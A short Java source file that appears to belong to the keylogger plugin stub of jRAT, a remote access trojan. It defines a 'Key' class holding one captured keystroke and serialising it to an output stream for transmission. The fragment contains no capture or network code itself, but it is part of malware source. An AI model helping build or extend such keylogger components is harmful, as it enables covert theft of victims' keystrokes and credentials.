package jrat.plugin.keylogger.stub.activities;

import java.io.DataOutputStream;

public class Key implements Activity {

	private final char key;

	public Key(char key) {
		this.key = key;
	}
	
	public char getKey() {
		return key;
	}

	@Override
	public void write(DataOutputStream dos) throws Exception {
		dos.writeChar(key);
	}
	
	@Override
	public String toString() {
		return Character.toString(key);
	}
	
	public char getChar() {
		return key;
	}

}
